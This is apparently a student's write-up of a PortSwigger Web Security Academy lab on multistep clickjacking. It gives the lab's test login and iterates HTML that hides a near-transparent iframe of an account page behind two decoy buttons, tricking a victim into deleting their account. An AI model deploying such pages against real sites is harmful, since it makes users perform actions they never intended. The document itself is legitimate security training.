
# 8 - Multistep clickjacking

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

---------------------------------------------

References:

- https://portswigger.net/web-security/csrf

- https://portswigger.net/web-security/clickjacking 

---------------------------------------------

Generated link: https://0a910056047f851e816330fc004400af.web-security-academy.net/



![img](images/Multistep%20clickjacking/1.png)


I took the example from https://portswigger.net/web-security/clickjacking:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

And adapted it to this example:

```
<head>
    <style>
        #target_website {
            position:relative;
            width:100%;
            height:100%;
            opacity:0.0001;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:530px;
            left:400px;
        }
       #button2 {
            position:absolute;
            top:330px;
            left:570px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

If you host it in the exploit server after clicking “Click me first” button it takes to the confirmation page:



![img](images/Multistep%20clickjacking/2.png)

Here, clicking the “Click me next” button the user would be deleted:



![img](images/Multistep%20clickjacking/3.png)

But if you send this, the user does not get deleted, probably because we used width:100% and height:100%, so the payload depends on the screen resolution. I will use a small ifram size with fixed size of 500x600 px:

```
<head>
    <style>
        #target_website {
            position:relative;
            //width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:495px;
            left:55px;
        }
       #button2 {
            position:absolute;
            top:290px;
            left:200px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

Adjust the first button:



![img](images/Multistep%20clickjacking/4.png)

And the second one:



![img](images/Multistep%20clickjacking/5.png)

This time we get the lab solved message!